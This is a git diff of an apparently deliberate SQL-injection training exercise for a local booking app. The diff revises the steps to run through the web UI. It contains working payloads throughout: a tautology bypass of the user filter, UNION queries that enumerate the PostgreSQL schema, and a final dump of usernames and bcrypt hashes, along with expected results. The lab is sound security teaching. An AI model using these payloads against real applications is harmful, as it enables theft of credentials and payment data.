@@ -25,26 +25,7 @@ Modern ORMs like Entity Framework Core use parameterised queries by default. The
 
 ---
 
-## Setup
-
-Start the stack:
-
-```bash
-docker compose up -d
-dotnet run --project src/BookingDojo.Api &
-dotnet run --project src/BookingDojo.Bff &
-cd src/bookingdojo-ui && npm run dev &
-```
-
-In `src/BookingDojo.Api/appsettings.json`, confirm:
-
-```json
-"Workshop": {
-  "BookingSearchSqlInjection": "Vulnerable"
-}
-```
-
-Restart the API if you change the flag.
+## Step 1 — Observe the attack surface
 
 The database is pre-seeded with bookings owned by different users:
 
@@ -52,10 +33,6 @@ The database is pre-seeded with bookings owned by different users:
 |-----------|---------|------------------------|-------------|
 | 1         | admin   | Alpine Lodge           | 1234        |
 | 2         | partner | Beach Paradise Resort  | 4242        |
-
----
-
-## Step 1 — Observe the attack surface
 
 Log in as `partner / Partner1234!` at `http://localhost:5173`.
 
@@ -68,15 +45,22 @@ The search correctly scopes results to your account — at least for normal inpu
 
 ---
 
-## Step 2 — Exploit the injection
+## Step 2 — Exploit the injection via the UI
 
-Type the following into the search box and click Search:
+In the **Search Bookings by Hotel** box, type the following and click **Search**:
 
 ```
 %' OR '1'='1' --
 ```
 
-You now see **all bookings from all users**, including `admin`'s card ending in `1234`.
+The results table now shows **all bookings from all users**:
+
+| ID | User | Hotel | Check-in | Check-out | Card |
+|----|------|-------|----------|-----------|------|
+| #1 | admin | Alpine Lodge | … | … | **** **** **** 1234 |
+| #2 | partner | Beach Paradise Resort | … | … | **** **** **** 4242 |
+
+You can read `admin`'s card number even though you are logged in as `partner`. The user ownership filter has been bypassed entirely.
 
 ### Why the payload works
 
@@ -143,7 +127,7 @@ Expected response from the injection request includes `admin`'s booking:
 
 ---
 
-## Step 4 — Enumerate the database and extract credentials
+## Step 4 — Enumerate the database and extract credentials via the UI
 
 The `OR '1'='1'` payload leaks cross-user booking data. A more sophisticated attacker uses **UNION-based injection** to query any table in the database — including the `Users` table.
 
@@ -155,29 +139,44 @@ A `UNION SELECT` appends extra rows to the original result set. The injected SEL
 
 The original query selects 11 columns in this order:
 
-| # | Column | Type |
-|---|--------|------|
-| 1 | Id | integer |
-| 2 | UserId | uuid |
-| 3 | Username | text |
-| 4 | HotelId | uuid |
-| 5 | CardLastFour | text |
-| 6 | CheckIn | timestamp |
-| 7 | CheckOut | timestamp |
-| 8 | SpecialRequests | text |
-| 9 | TotalPrice | decimal |
-| 10 | CreatedAt | timestamp |
-| 11 | HotelName | text |
+| # | Column | Type | Visible in UI as |
+|---|--------|------|-----------------|
+| 1 | Id | integer | **ID** |
+| 2 | UserId | uuid | (hidden) |
+| 3 | Username | text | **User** |
+| 4 | HotelId | uuid | (hidden) |
+| 5 | CardLastFour | text | **Card** (prefixed with `**** **** **** `) |
+| 6 | CheckIn | timestamp | **Check-in** |
+| 7 | CheckOut | timestamp | **Check-out** |
+| 8 | SpecialRequests | text | (hidden) |
+| 9 | TotalPrice | decimal | (hidden) |
+| 10 | CreatedAt | timestamp | (hidden) |
+| 11 | HotelName | text | **Hotel** |
+
+The strategy: put a recognisable marker in column 11 (shown as **Hotel**) so you can spot injected rows, and exfiltrate data through columns 3 (**User**) and 5 (**Card**).
+
+> **Pagination note:** The database is seeded with only 2 bookings, so UNION rows will always fit within the UI's 10-result cap.
 
 ### Step 4a — Discover schemas
 
-Paste this into the search box:
+Paste into the search box and click **Search**:
 
 ```
 %' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',schema_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',0.00,NOW(),'SCHEMAS' FROM information_schema.schemata --
 ```
 
-Rows with **Hotel = "SCHEMAS"** appear in the results. The **User** column reveals the schema names: `bookingdojo`, `public`, `pg_catalog`, etc.
+In the results table, look for rows where **Hotel = SCHEMAS** — the **User** column contains each schema name:
+
+| ID | User | Hotel |
+|----|------|-------|
+| #1 | admin | Alpine Lodge |
+| #2 | partner | Beach Paradise Resort |
+| #1 | bookingdojo | SCHEMAS |
+| #1 | public | SCHEMAS |
+| #1 | pg_catalog | SCHEMAS |
+| … | … | … |
+
+`bookingdojo` is the schema that holds the application tables.
 
 ### Step 4b — Discover tables
 
@@ -185,7 +184,7 @@ Rows with **Hotel = "SCHEMAS"** appear in the results. The **User** column revea
 %' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',table_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',0.00,NOW(),'TABLES' FROM information_schema.tables WHERE table_schema='bookingdojo' --
 ```
 
-Rows with **Hotel = "TABLES"** list every table: `Users`, `Bookings`, `Hotels`, `Coupons`, `PasswordResetTokens`.
+Rows where **Hotel = TABLES** list every table in the **User** column: `Users`, `Bookings`, `Hotels`, `Coupons`, `PasswordResetTokens`.
 
 ### Step 4c — Discover columns in Users
 
@@ -193,34 +192,28 @@ Rows with **Hotel = "TABLES"** list every table: `Users`, `Bookings`, `Hotels`, 
 %' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',column_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',0.00,NOW(),'COLUMNS' FROM information_schema.columns WHERE table_schema='bookingdojo' AND table_name='Users' --
 ```
 
-Rows with **Hotel = "COLUMNS"** reveal: `Id`, `Username`, `PasswordHash`, `Role`, `PartnerId`.
+Rows where **Hotel = COLUMNS** reveal the column names in **User**: `Id`, `Username`, `PasswordHash`, `Role`, `PartnerId`.
 
 ### Step 4d — Extract usernames and password hashes
 
-Now the attacker knows the exact table and column names. This final payload dumps all credentials:
+Now the attacker knows the exact table and column names. Paste this final payload:
 
 ```
 %' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',"Username",'00000000-0000-0000-0000-000000000000',"PasswordHash",NOW(),NOW(),'INJECTED',0.00,NOW(),'PWNED' FROM bookingdojo."Users" --
 ```
 
-In the search results, rows where **Hotel = "PWNED"** contain:
-- **User** column → the account username (`admin`, `partner`, `support`)
-- **Card** column → the bcrypt password hash (`$2a$11$...`)
+In the results table, rows where **Hotel = PWNED** contain the full credential dump:
 
-> **Note:** The UI sends `pageSize=10`, so if there are many real bookings those 10 slots fill up first and the injected rows may not appear. Bypass the limit by sending the request without `pageSize`:
->
-> ```bash
-> curl -s -b cookies.txt \
->   "http://localhost:5001/bff/bookings/search?q=%25'+OR+'1'%3D'1'+UNION+SELECT+1%2C'00000000-0000-0000-0000-000000000000'%2C%22Username%22%2C'00000000-0000-0000-0000-000000000000'%2C%22PasswordHash%22%2CNOW()%2CNOW()%2C'INJECTED'%2C0.00%2CNOW()%2C'PWNED'+FROM+bookingdojo.%22Users%22+--" \
->   | jq '.results[] | select(.hotelName == "PWNED") | {username, cardLastFour}'
-> ```
->
-> Expected output:
-> ```json
-> { "username": "admin",   "cardLastFour": "$2a$11$..." }
-> { "username": "partner", "cardLastFour": "$2a$11$..." }
-> { "username": "support", "cardLastFour": "$2a$11$..." }
-> ```
+| ID | User | Hotel | Card |
+|----|------|-------|------|
+| #1 | admin | Alpine Lodge | **** **** **** 1234 |
+| #2 | partner | Beach Paradise Resort | **** **** **** 4242 |
+| #1 | admin | PWNED | **** **** **** $2a$11$… |
+| #1 | partner | PWNED | **** **** **** $2a$11$… |
+| #1 | support | PWNED | **** **** **** $2a$11$… |
+
+- **User** column → account username
+- **Card** column → bcrypt password hash (the UI prepends `**** **** **** ` but the full hash is visible)
 
 ---
 
